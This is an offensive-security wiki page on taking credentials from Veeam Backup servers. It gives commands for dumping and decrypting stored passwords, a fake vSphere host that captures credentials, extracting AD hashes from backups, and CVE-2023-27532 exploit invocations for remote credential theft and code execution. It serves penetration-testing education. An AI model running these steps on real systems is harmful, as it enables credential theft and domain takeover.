---
description: MITRE ATT&CK™ Credential Access - Tactic TA0006
---

# Veeam Backup

## Theory

[Veeam Backup & Recplication](https://www.veeam.com/) is a widely used tool  for backing up virtual environments built on VMware vSphere, Nutanix AHV, and Microsoft Hyper-V hypervisors. If you manage to compromise the Veeam Backup & Replication serveur, you can extract passwords and hashes from its database or from the machines that are backed up

{% hint style="info" %}
Veam servers used for the backup should not be joined to the domain, so when attackers compromise the domain, they can't destroy your backup.
{% endhint %}

## Practice

### Credentials Dump

Veeam requires the username and password for any machine you want to back it up. The user provided should have high privileges on the machine, so usually, if you're going to backup the domain devices, you will put administrator creds. Veeam stores these creds on MS-SQL using [ProtectedData.Protect](https://msdn.microsoft.com/en-us/library/2fh8203k\(v=vs.110\).aspx) method of CryptoAPI. You can easily extract them if you have **admin privilege on the Veeam Server**.

{% tabs %}
{% tab title="Veeam-Get-creds" %}
You can do this step by running the [veeam-creds](https://github.com/sadshade/veeam-creds) script and extract passwords.

```powershell
.\Veeam-Get-Creds.ps1
```
{% endtab %}

{% tab title="Veeampot" %}
If you are able to connect to the Veeam console and you have the right to create new connections to the hypervisor. You can have Veeam connect to a fake vSphere host.

{% hint style="info" %}
It doesn’t matter if the console is running on the same host or on a different one.
{% endhint %}

1. First, run [veampot.py](https://github.com/sadshade/veeam-creds/blob/main/veeampot.py) on your attacking machine

```bash
python3 veampot.py
```

2. Then, create a new connection to the vSphere server in the Veeam console in the Inventory section;
3. Enter the address of the machine with the running script specifying the connection port `8443`;
4. Select the required account and complete the wizard.&#x20;
5. Finlay, get password in script output.
{% endtab %}

{% tab title="SQL Request" %}
From SQL management studio (of any SQL management interface access method) run the following again the veeam managemnt database:

```sql
SELECT TOP (1000) [id] 
,[user_name] 
,[password] 
,[usn] 
,[description] 
,[visible] 
,[change_time_utc] 
FROM [VeeamBackup].[dbo].[Credentials] 
```

This will dumpt the password hashes. Copy them and then run a PowerShell interface

```powershell
Add-Type -Path "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Common.dll" 

$encoded = 'INSERT_HASH_HERE' 

[Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded) 
```
{% endtab %}

{% tab title="PowerShell Empire" %}
You may use the [VeeamGetCreds.yaml](https://github.com/sadshade/veeam-creds/blob/main/VeeamGetCreds.yaml) [PowerShell Empire](https://github.com/EmpireProject/Empire) module witch adapted Veeam-Get-Creds.ps1 script.

1. copy VeeamGetCreds.yaml to empire/server/modules/powershell/credentials/ folder
2. Run Empire server and client
3. Use as usual Empire module by name /powershell/credentials/VeeamGetCreds
{% endtab %}
{% endtabs %}

### Backup Machines - Hashes Extraction

If you can access a backup image, you can restore it on your local disk. More interesting, we can use the Veam individual files recover feature. Depending on the server backup type, you may extract SAM and LSA secrets from registry hives or even the NTDS.dit file if it's a domain controller. Check this section for more information about [credentials dumping](../../../../ad/movement/credentials/dumping.md).

{% tabs %}
{% tab title="From Veeam Backup files" %}
When you have a valid backup image, Veeam provides a restore mechanism by "[VBK Extract](https://www.veeam.com/fr/data-center-availability-suite-vcp-download.html?ref=julien.io)".  You can exfiltrate the backup images and extract the backup in multiple extensions like VMDM, VHD, or VHDX on your attacking host.

```bash
#Before, copy backups files in the current directory
#VBK Extract on linux
tar -zxvf VeamExtract*
./extract
```

We can then create a new VM from this files or mount it to our disk to recover sensitive files.
{% endtab %}

{% tab title="From Veeam Console" %}
From the Veeam console, to restore individual files, you need to select the required VM from the list of tasks from the section _Backups > Disk > ${JOB\_NAME}_ and select the recovery mode for individual files from the menu.

<figure><img src="../../../../.gitbook/assets/0_N6yuiYvbUpQUiF9s.webp" alt=""><figcaption></figcaption></figure>

After completing the wizard, a file selection window will open. To restore and decrypt the Active Directory database, you can extract several files:

* ntds.dit — encrypted [AD database](https://habr.com/ru/post/172865/);
* SYSTEM — registry branch containing the [BootKey ](https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html)encryption key;
* SECURITY — registry branch containing cached [LSA Secrets](https://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html) passwords;
* SAM — The [Security Accounts Manager](https://ru.wikipedia.org/wiki/Security\_Account\_Manager), which contains password hashes of local users.
{% endtab %}
{% endtabs %}

### Unauthenticated Credentials Dump & RCE - CVE-2023-27532

Vulnerability CVE-2023-27532 in a Veeam Backup & Replication component allows an unauthenticated user operating within the backup infrastructure network perimeter to obtain encrypted credentials stored in the configuration database or perform remote code execution.

{% hint style="info" %}
Any Veeam Backup & Replication version prior to V12  ([build 12.0.0.1420 P20230223](https://www.veeam.com/kb4420)) and V11a ([build 11.0.1.1261 P20230227](https://www.veeam.com/kb4245)) is vulnerable.
{% endhint %}

{% tabs %}
{% tab title="Dump Credentials" %}
We may use the [sfewer-r7's exploit](https://github.com/sfewer-r7/CVE-2023-27532) (C#) to dump credentials from a remote Veeam server.

```powershell
VeeamHax.exe --target <VEAM_IP>
```

Alternatively, we may use [this exploit](https://github.com/horizon3ai/CVE-2023-27532) (C#) from horizon3ai.

```
CVE-2023-27532.exe net.tcp://<VEAM_IP>:9401/
```
{% endtab %}

{% tab title="RCE" %}
We may use the [sfewer-r7's exploit](https://github.com/sfewer-r7/CVE-2023-27532) (C#) to run an arbitrary command with local system privileges on the remote Veeam server.

```powershell
VeeamHax.exe --target 192.168.0.100 --cmd calc.exe
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://medium.com/@_sadshade/veeam-backup-penetration-getting-the-most-out-of-pentest-17e0da021238" %}

{% embed url="https://www.pwndefend.com/2021/02/15/retrieving-passwords-from-veeam-backup-servers/" %}

{% embed url="https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.htm" %}
